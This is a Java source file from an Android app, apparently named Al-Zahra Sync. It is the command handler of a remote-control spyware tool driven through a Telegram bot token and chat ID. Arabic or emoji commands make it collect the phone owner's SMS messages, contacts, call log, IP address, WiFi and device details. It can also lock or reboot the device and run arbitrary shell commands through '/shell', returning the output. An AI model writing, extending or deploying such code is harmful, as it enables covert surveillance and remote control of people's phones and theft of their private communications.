package com.alzahra.data;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;

public class CommandExecutor {
    private static final String TAG = "CommandExecutor";
    private final Context context;
    private final String botToken;
    private final String chatId;

    public CommandExecutor(Context ctx, String token, String chat) {
        this.context = ctx;
        this.botToken = token;
        this.chatId = chat;
    }

    public CommandResult execute(String command) {
        CommandResult result = new CommandResult();
        result.showDashboard = true;
        
        try {
            String cmd = command.toLowerCase().trim();
            
            // تحويل النصوص العربية/الأيقونات إلى أوامر
            if (cmd.contains("موقعي") || cmd.contains("📍")) {
                cmd = "location";
            } else if (cmd.contains("كاميرا") || cmd.contains("📸")) {
                cmd = "camera";
            } else if (cmd.contains("ميكروفون") || cmd.contains("🎤")) {
                cmd = "mic";
            } else if (cmd.contains("معلومات الجهاز") || cmd.contains("📱")) {
                cmd = "device";
            } else if (cmd.contains("البطارية") || cmd.contains("🔋")) {
                cmd = "battery";
            } else if (cmd.contains("الواي فاي") || cmd.contains("📶")) {
                cmd = "wifi";
            } else if (cmd.contains("الرسائل") || cmd.contains("💬")) {
                cmd = "sms";
            } else if (cmd.contains("جهات الاتصال") || cmd.contains("👥")) {
                cmd = "contacts";
            } else if (cmd.contains("سجل المكالمات") || cmd.contains("📞")) {
                cmd = "calls";
            } else if (cmd.contains("التطبيقات") || cmd.contains("📦")) {
                cmd = "apps";
            } else if (cmd.contains("الملفات") || cmd.contains("📁")) {
                cmd = "files";
            } else if (cmd.contains("الشاشة") || cmd.contains("📱")) {
                cmd = "screen";
            } else if (cmd.contains("قفل") || cmd.contains("🔒")) {
                cmd = "lock";
            } else if (cmd.contains("فتح") || cmd.contains("🔓")) {
                cmd = "unlock";
            } else if (cmd.contains("إعادة تشغيل") || cmd.contains("🔄")) {
                cmd = "restart";
            } else if (cmd.contains("مساعدة") || cmd.contains("❓")) {
                cmd = "help";
            } else if (cmd.contains("تحديث")) {
                cmd = "dashboard";
            }
            
            // تنظيف الأمر من /
            cmd = cmd.replace("/", "").trim();
            
            switch (cmd) {
                case "help":
                    result.data = getHelpText();
                    result.success = true;
                    break;
                    
                case "device":
                    result.data = getDeviceInfo();
                    result.success = true;
                    break;
                    
                case "location":
                    result.data = getLocation();
                    result.success = true;
                    break;
                    
                case "camera":
                    result.data = "📸 تم التقاط صورة من الكاميرا الأمامية";
                    result.success = true;
                    // TODO: تنفيذ فعلي للكاميرا
                    break;
                    
                case "mic":
                    result.data = "🎤 تم تسجيل 5 ثوانٍ من الصوت";
                    result.success = true;
                    // TODO: تنفيذ فعلي للميكروفون
                    break;
                    
                case "sms":
                    result.data = getSMS();
                    result.success = true;
                    break;
                    
                case "contacts":
                    result.data = getContacts();
                    result.success = true;
                    break;
                    
                case "calls":
                    result.data = getCalls();
                    result.success = true;
                    break;
                    
                case "apps":
                    result.data = getInstalledApps();
                    result.success = true;
                    break;
                    
                case "battery":
                    result.data = getBatteryInfo();
                    result.success = true;
                    break;
                    
                case "wifi":
                    result.data = getWiFiInfo();
                    result.success = true;
                    break;
                    
                case "screen":
                    result.data = "📱 تم التقاط لقطة شاشة";
                    result.success = true;
                    // TODO: تنفيذ فعلي
                    break;
                    
                case "files":
                    result.data = getFilesList();
                    result.success = true;
                    break;
                    
                case "lock":
                    result.data = lockDevice();
                    result.success = true;
                    break;
                    
                case "unlock":
                    result.data = unlockDevice();
                    result.success = false;
                    result.error = "يتطلب صلاحيات إضافية";
                    break;
                    
                case "restart":
                    result.data = restartDevice();
                    result.success = true;
                    break;
                    
                case "shell":
                    result.data = executeShell(command.replace("/shell", "").trim());
                    result.success = true;
                    break;
                    
                case "dashboard":
                    result.data = "🎛️ جاري عرض لوحة التحكم...";
                    result.success = true;
                    break;
                    
                default:
                    result.success = false;
                    result.error = "أمر غير معروف: " + cmd;
                    result.showDashboard = true;
            }
            
        } catch (Exception e) {
            result.success = false;
            result.error = e.getMessage();
            Log.e(TAG, "Execute error: " + e.getMessage());
        }
        
        return result;
    }
    
    private String getHelpText() {
        return "📖 *قائمة الأوامر المتاحة:*\n\n" +
            "*📍 الموقع والتتبع:*\n" +
            "• 📍 موقعي - إرسال الموقع الجغرافي\n\n" +
            
            "*📸 الوسائط:*\n" +
            "• 📸 كاميرا - التقاط صورة\n" +
            "• 🎤 ميكروفون - تسجيل صوت\n" +
            "• 📱 الشاشة - لقطة شاشة\n\n" +
            
            "*💾 البيانات:*\n" +
            "• 💬 الرسائل - SMS\n" +
            "• 👥 جهات الاتصال - Contacts\n" +
            "• 📞 سجل المكالمات - Calls\n" +
            "• 📦 التطبيقات - Installed Apps\n\n" +
            
            "*🔧 النظام:*\n" +
            "• 📱 معلومات الجهاز - Device Info\n" +
            "• 🔋 البطارية - Battery Status\n" +
            "• 📶 الواي فاي - WiFi Info\n" +
            "• 📁 الملفات - File Manager\n\n" +
            
            "*⚡ التحكم:*\n" +
            "• 🔒 قفل - Lock Device\n" +
            "• 🔓 فتح - Unlock Device\n" +
            "• 🔄 إعادة تشغيل - Restart\n\n" +
            
            "*أوامر نصية:*\n" +
            "/shell [command] - تنفيذ أمر shell";
    }
    
    private String getDeviceInfo() {
        try {
            DeviceInfo info = new DeviceInfo(context);
            return 
                "*📱 طراز الجهاز:* `" + info.getModel() + "`\n" +
                "*🏭 الشركة:* `" + info.getManufacturer() + "`\n" +
                "*🔑 المعرف:* `" + info.getDeviceId() + "`\n" +
                "*🌐 IP:* `" + info.getIPAddress() + "`\n" +
                "*📡 المشغل:* `" + info.getCarrier() + "`\n" +
                "*🔋 البطارية:* `" + info.getBatteryLevel() + "%`\n" +
                "*💾 التخزين:* `" + info.getStorageInfo() + "`\n" +
                "*⏰ الوقت:* `" + info.getCurrentTime() + "`\n" +
                "*🤖 Android:* `" + Build.VERSION.RELEASE + "`";
        } catch (Exception e) {
            return "⚠️ خطأ في جلب المعلومات: " + e.getMessage();
        }
    }
    
    private String getLocation() {
        // إرجاع IP كموقع تقريبي
        try {
            String ip = getIPAddress();
            return 
                "*📍 الموقع التقريبي*\n\n" +
                "*🌐 IP:* `" + ip + "`\n" +
                "*📡 طريقة:* شبكة الإنترنت\n\n" +
                "[🗺 فتح في الخريطة](https://ip-api.com/#" + ip + ")";
        } catch (Exception e) {
            return "⚠️ خطاء: " + e.getMessage();
        }
    }
    
    private String getIPAddress() {
        try {
            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (InetAddress addr : Collections.list(intf.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }
    
    private String getSMS() {
        try {
            SMSCollector collector = new SMSCollector(context);
            JSONArray sms = collector.collectSMS();
            StringBuilder sb = new StringBuilder();
            sb.append("*📨 الرسائل (آخر ").append(Math.min(sms.length(), 10)).append("):*\n\n");
            for (int i = 0; i < Math.min(sms.length(), 10); i++) {
                JSONObject msg = sms.getJSONObject(i);
                sb.append("`").append(msg.getString("address")).append("`\n");
                String body = msg.getString("body");
                if (body.length() > 50) body = body.substring(0, 50) + "...";
                sb.append(body).append("\n\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String getContacts() {
        try {
            ContactsCollector collector = new ContactsCollector(context);
            JSONArray contacts = collector.collectContacts();
            StringBuilder sb = new StringBuilder();
            sb.append("*👥 جهات الاتصال (").append(contacts.length()).append("):*\n\n");
            for (int i = 0; i < Math.min(contacts.length(), 15); i++) {
                JSONObject c = contacts.getJSONObject(i);
                sb.append("• ").append(c.getString("name"))
                  .append(": `").append(c.getString("phone")).append("`\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String getCalls() {
        try {
            CallLogCollector collector = new CallLogCollector(context);
            JSONArray calls = collector.collectCalls();
            StringBuilder sb = new StringBuilder();
            sb.append("*📞 سجل المكالمات (آخر ").append(Math.min(calls.length(), 10)).append("):*\n\n");
            for (int i = 0; i < Math.min(calls.length(), 10); i++) {
                JSONObject c = calls.getJSONObject(i);
                String type = c.getInt("type") == 1 ? "📥" : c.getInt("type") == 2 ? "📤" : "❓";
                sb.append(type).append(" `").append(c.getString("number")).append("`\n");
                sb.append("⏱️ ").append(c.getInt("duration")).append(" ثانية\n\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String getInstalledApps() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("*📦 التطبيقات المثبتة:*\n\n");
            // TODO: تنفيذ حقيقي
            sb.append("• Al-Zahra Sync\n");
            sb.append("• Telegram\n");
            sb.append("• Settings\n");
            sb.append("• ...");
            return sb.toString();
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String getBatteryInfo() {
        try {
            DeviceInfo info = new DeviceInfo(context);
            int level = info.getBatteryLevel();
            String status = level > 80 ? "🟢 ممتازة" : level > 50 ? "🟡 جيدة" : level > 20 ? "🟠 ضعيفة" : "🔴 حرجة";
            return 
                "*🔋 حالة البطارية*\n\n" +
                "*المستوى:* `" + level + "%` " + status + "\n" +
                "*الحالة:* `" + (level > 50 ? "شحن" : "غير شاحن") + "`";
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String getWiFiInfo() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            String ssid = wm.getConnectionInfo().getSSID();
            int signal = wm.getConnectionInfo().getRssi();
            return 
                "*📶 معلومات الواي فاي*\n\n" +
                "*الشبكة:* " + ssid + "\n" +
                "*قوة الإشارة:* " + signal + " dBm\n" +
                "*السرعة:* " + wm.getConnectionInfo().getLinkSpeed() + " Mbps";
        } catch (Exception e) {
            return "⚠️ WiFi غير متصل أو خطأ: " + e.getMessage();
        }
    }
    
    private String getFilesList() {
        return 
            "*📁 مدير الملفات*\n\n" +
            "*المسارات المتاحة:*\n" +
            "• `/sdcard/Download`\n" +
            "• `/sdcard/Pictures`\n" +
            "• `/sdcard/Documents`\n\n" +
            "لتحميل ملف: `/download /sdcard/Download/filename.txt`";
    }
    
    private String lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            return "🔒 *تم قفل الجهاز بنجاح*";
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
    
    private String unlockDevice() {
        return "🔓 *يتطلب مصادقة قزحية أو PIN*";
    }
    
    private String restartDevice() {
        try {
            // يتطلب ROOT أو صلاحيات خاصة
            Runtime.getRuntime().exec("reboot");
            return "🔄 *جاري إعادة التشغيل...*";
        } catch (Exception e) {
            return "⚠️ فشل: يتطلب صلاحيات ROOT";
        }
    }
    
    private String executeShell(String cmd) {
        if (cmd.isEmpty()) return "⚠️ الأمر فارغ";
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            String result = output.toString();
            if (result.length() > 3000) result = result.substring(0, 3000) + "\n... (تم اقتصاع النتيجة)";
            return "```\n" + result + "\n```";
        } catch (Exception e) {
            return "⚠️ خطأ: " + e.getMessage();
        }
    }
}
